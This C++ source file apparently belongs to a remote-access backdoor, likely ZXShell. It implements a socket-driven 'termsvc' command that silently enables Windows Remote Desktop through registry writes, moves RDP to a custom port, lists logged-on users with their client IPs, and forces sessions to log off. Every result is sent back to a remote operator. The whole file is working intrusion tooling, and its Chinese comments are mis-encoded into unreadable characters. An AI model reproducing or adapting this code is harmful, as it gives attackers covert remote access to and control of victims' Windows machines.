//������ر��ն˷���

#include "..\zxsCommon\zxsWinAPI.h"
#include <Winternl.h>
#include <WtsApi32.h>

#pragma comment(lib, "WtsApi32.lib")

typedef BOOLEAN WINAPI _WinStationReset(
  HANDLE hServer,
  ULONG LogonId,
  ULONG unknown// 1 ?
);

typedef BOOLEAN WINAPI _WinStationQueryInformationW(
  HANDLE hServer,
  ULONG LogonId,
  WINSTATIONINFOCLASS WinStationInformationClass,
  PVOID pWinStationInformation,
  ULONG WinStationInformationLength,
  PULONG pReturnLength
);

typedef WCHAR * WINAPI _StrConnectState(
  int code,
  int flag
);

_WinStationReset *myWinStationReset;
_WinStationQueryInformationW *myWinStationQueryInformationW;
_StrConnectState *myStrConnectState;

BOOL winstaLogOff(SOCKET Socket, DWORD logonid)
{
	if(myWinStationReset == NULL)
	{
		myWinStationReset = (_WinStationReset*)ZXSAPI::GetProcAddress(ZXSAPI::LoadLibrary("winsta.dll"), "WinStationReset");
	}

	if(myWinStationReset == NULL)
		return FALSE;

	BOOL ret;

	ret = myWinStationReset(NULL, logonid, 1);

	err_display(Socket, "LogOff", 1);

	return ret;
}

WCHAR *tsGetState(int code)
{
	if(myStrConnectState == NULL)
	{
		myStrConnectState = (_StrConnectState*)ZXSAPI::GetProcAddress(ZXSAPI::LoadLibrary("UTILDLL.dll"), "StrConnectState");
	}
	if(myStrConnectState == NULL)
		return NULL;
	
	return myStrConnectState(code, 1);
}

int winstaQuerySession(SOCKET Socket)
{
/*	if(myWinStationQueryInformationW == NULL)
	{
		myWinStationQueryInformationW = (_WinStationQueryInformationW*)ZXSAPI::GetProcAddress(ZXSAPI::LoadLibrary("winsta.dll"), "WinStationQueryInformationW");
	}
	if(myWinStationQueryInformationW == NULL)
		return FALSE;
*/
	int ret;

	DWORD Count;
	PWTS_SESSION_INFO pSessionInfoHead;
	PWTS_SESSION_INFO pSessionInfo;

	WTS_CLIENT_ADDRESS *clientaddr;
	char *clientname;
	char *userName;
	char szIP[32];
	char szState[32];
	DWORD BytesReturned;


	ret = WTSEnumerateSessions(
		NULL,
		0,
		1,
		&pSessionInfoHead,
		&Count
		);

	if(!ret)
	{
		SendMessage(Socket, "Enumerate Terminal Sessions Failed. %d\r\n", GetLastError());
		return FALSE;
	}

	SendMessage(Socket, "SessionID    SessionName    UserName       ClientName       IP               State\r\n");

	pSessionInfo = pSessionInfoHead;
//State
	for(int t=0; t<Count; t++)
	{
		clientaddr = NULL;
		clientname = NULL;
		userName = NULL;

		WTSQuerySessionInformation(
			WTS_CURRENT_SERVER_HANDLE,
			pSessionInfo->SessionId,
			WTSClientAddress,
			(LPTSTR*)&clientaddr,
			&BytesReturned);

		WTSQuerySessionInformation(
			WTS_CURRENT_SERVER_HANDLE,
			pSessionInfo->SessionId,
			WTSClientName,
			(LPTSTR*)&clientname,
			&BytesReturned);

		WTSQuerySessionInformation(
			WTS_CURRENT_SERVER_HANDLE,
			pSessionInfo->SessionId,
			WTSUserName,
			(LPTSTR*)&userName,
			&BytesReturned);

		WCHAR *pstr = tsGetState(pSessionInfo->State);
		WideCharToMultiByte(CP_ACP, 0, pstr, wcslen(pstr)*sizeof(WCHAR)+2, szState, sizeof(szState), NULL, NULL);

		if(clientaddr->AddressFamily == AF_INET)
			sprintf(szIP, "%d.%d.%d.%d",
				clientaddr->Address[2],
				clientaddr->Address[3],
				clientaddr->Address[4],
				clientaddr->Address[5]
				);
		else
			sprintf(szIP, "    ");

		SendMessage(Socket, "%-11d  %-13s  %-13s  %-13s  %-15s  %s\r\n",
			pSessionInfo->SessionId,
			pSessionInfo->pWinStationName,
			userName,
			clientname,
			szIP,
			szState
			);

		WTSFreeMemory(clientaddr);
		WTSFreeMemory(clientname);
		WTSFreeMemory(userName);
		WTSFreeMemory(NULL);

		pSessionInfo++;
	}

	WTSFreeMemory(pSessionInfoHead);

	return ret;
}

void SetTermPort(SOCKET Socket, WORD port)
{   
	unsigned long newport =0;
	newport= port;
	if(newport == 0)
		return;
	int s=WriteReg(HKEY_LOCAL_MACHINE,	
		"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
		"PortNumber",
		REG_DWORD, 
		NULL,
		newport,0);
	if(s)
		SendMessage(Socket, "The Terminal Service Port Has Been Set To %d\r\n",newport);
	else 
		SendMessage(Socket, "Fail To Set New Terminal Service Port\r\n");

}

bool GetTermsvcStatus()
{
	DWORD bDeny = 1;
	DWORD TSEnabled = 0;
	DWORD startVal=0;

	if(!ReadReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", (char*)&startVal, sizeof(startVal)))
		return false;
	if(startVal != 2)
		return false;

	if(!ReadReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "Start", (char*)&startVal, sizeof(startVal)))
		return false;
	if(startVal != 2)
		return false;

	if(!ReadReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", (char*)&TSEnabled, sizeof(TSEnabled)))
		return false;
	if(!TSEnabled)
		return false;
		
	if(!ReadReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", (char*)&bDeny, sizeof(bDeny)))
	{
		return true;
	}
	
	if(bDeny == FALSE)
		return true;
	else
		return false;

}

void ViewTermStat(SOCKET Socket)
{
	int stat = 1;
/*	HKEY phkResult;
	DWORD type_1=REG_DWORD;
	DWORD cbData_1=80;
	DWORD startVal=0;

	if(ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
		0, KEY_READ, &phkResult)==ERROR_SUCCESS)
	{
		if(RegQueryValueEx(phkResult, "fDenyTSConnections", NULL, &type_1, (unsigned char *)&stat, &cbData_1)==ERROR_SUCCESS)
		{
			SendMessage(Socket, "Terminal Service Stat(For xp/2k3): %s\r\n", (stat ? "Disabled" : "Enabled"));
			RegCloseKey(phkResult);
			return;
		}
	}
	SendMessage(Socket, "RegOpenKeyEx Error.\r\n");
*/

	stat = GetTermsvcStatus();
	SendMessage(Socket, "Terminal Service Status: %s\r\n", (stat ? "Enabled" : "Disabled"));
}

void ViewTermPort(SOCKET Socket)
{
	HKEY phkResult;
	int port = 3389;
	DWORD type_1=REG_DWORD;
	DWORD cbData_1=80;
	if(ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
		0, KEY_READ, &phkResult)==ERROR_SUCCESS)
	{
		if(ZXSAPI::RegQueryValueEx(phkResult, "PortNumber", NULL, &type_1, (unsigned char *)&port, &cbData_1)==ERROR_SUCCESS)
		{
			SendMessage(Socket, "Terminal Service Port: %d\r\n", port);
			RegCloseKey(phkResult);
			return;
		}
		RegCloseKey(phkResult);
	}
	SendMessage(Socket, "RegOpenKeyEx Error.\r\n");
}

void ViewTermsvc(SOCKET Socket)
{
	ViewTermStat(Socket);
	ViewTermPort(Socket);
}

void InstallTerm(SOCKET Socket, bool flag)
{
   int a=0;

   WriteReg(HKEY_LOCAL_MACHINE,
	"SYSTEM\\CurrentControlSet\\Services\\TermDD",
	"Start",
	REG_DWORD, 
	NULL,
	2, 
	0);//for 2k

   int c=WriteReg(HKEY_LOCAL_MACHINE,
	"SYSTEM\\CurrentControlSet\\Services\\TermService",
	"Start",
	REG_DWORD, 
	NULL,
	2,
	0); 

	int b=WriteReg(HKEY_LOCAL_MACHINE,
	"SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
	"fDenyTSConnections",
	REG_DWORD, 
	NULL,
	flag ? 0 : 1,
	1);//for xp/2k3

	//!b��ʾ�޸�fDenyTSConnectionsʧ�ܣ���ô��Ϊ��ϵͳ��2000�������úͽ��ö�Ҫ�޸�TSEnabled����xp���ò�Ӧ���޸�TSEnabled������������TSEnabled=1
	if(!b || flag)
	{
	   a=WriteReg(HKEY_LOCAL_MACHINE,
		"SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
		"TSEnabled",
		REG_DWORD, 
		NULL,
		flag ? 1 : 0, 
		0);//for 2k
	}
	
  
   if((a || b) && c)
	{
	   if(flag)
		    SendMessage(Socket, "Set Terminal Service Enabled.\r\n");
	   else
		   SendMessage(Socket, "Set Terminal Service Disabled\r\n");
	}
   else
	   SendMessage(Socket, "Set New Terminal Service Failed\r\n");
   
}

int TermSvc(MainPara *args)
{
	SPAMFUNCTION
		
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	char *Usage = ""
		"DESCRIPTION:\r\n"
		"            Config Terminal Service Supports 2000/xp/2003.\r\n"
		"USAGE:\r\n"
		"      termsvc -enable -disable -view -p <newport> -query -logoff <session id>\r\n"
		"      -enable    Enable Terminal Service.\r\n"
		"      -disable   Disable Terminal Service.\r\n"
		"      -view      View Terminal Service Settings.\r\n"
		"      -p         Set New Terminal Service Port.\r\n"
		"example:\r\n"
		"      termsvc -query\r\n"
		"      termsvc -logoff 1\r\n"
		"      termsvc -enable -p 3399\r\n"
		"      termsvc -p 3399\r\n"
		"      termsvc -view\r\n";
	if(argc < 2)
	{
		SendMessage(Socket,Usage);
		return 0;
	}

	BOOL bError = FALSE;
/*	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			if(!stricmp(&argv[i][1], "enable"))
			{
				bError = TRUE;
				InstallTerm(Socket, 1);
			}else if(!stricmp(&argv[i][1], "disable"))
			{
				bError = TRUE;
				InstallTerm(Socket, 0);
			}else if(!stricmp(&argv[i][1], "view"))
			{
				bError = TRUE;
				ViewTermsvc(Socket);
			}else if(!stricmp(&argv[i][1], "query"))
			{
				bError = TRUE;
				winstaQuerySession(Socket);
			}
			continue;
		}
		else
		{
			if(i==1) continue;
			if(!stricmp(&argv[i-1][1], "p"))
			{
				bError = TRUE;
				SetTermPort(Socket, atoi(argv[i]));
			}else if(!stricmp(&argv[i-1][1], "logoff"))
			{
				bError = TRUE;
				winstaLogOff(Socket, atoi(argv[i]));
				break;
			}
		}
	}
	if(bError == FALSE)
		SendMessage(Socket,Usage);
*/
	CGetOpt cmdopt(argc, argv, false);

	if(cmdopt.getstr("p"))
	{
		bError = TRUE;
		SetTermPort(Socket, atoi(cmdopt));
	}

	if(cmdopt.checkopt("enable"))
	{
		bError = TRUE;
		InstallTerm(Socket, true);
	}else if(cmdopt.checkopt("disable"))
	{
		bError = TRUE;
		InstallTerm(Socket, false);
	}

	if(cmdopt.checkopt("view"))
	{
		bError = TRUE;
		ViewTermsvc(Socket);
	}
	if(cmdopt.checkopt("query"))
	{
		bError = TRUE;
		winstaQuerySession(Socket);
	}
	if(cmdopt.getstr("logoff"))
	{
		bError = TRUE;
		winstaLogOff(Socket, atoi(cmdopt));
	}
	if(bError == FALSE)
		SendMessage(Socket,Usage);

	return 0;
}


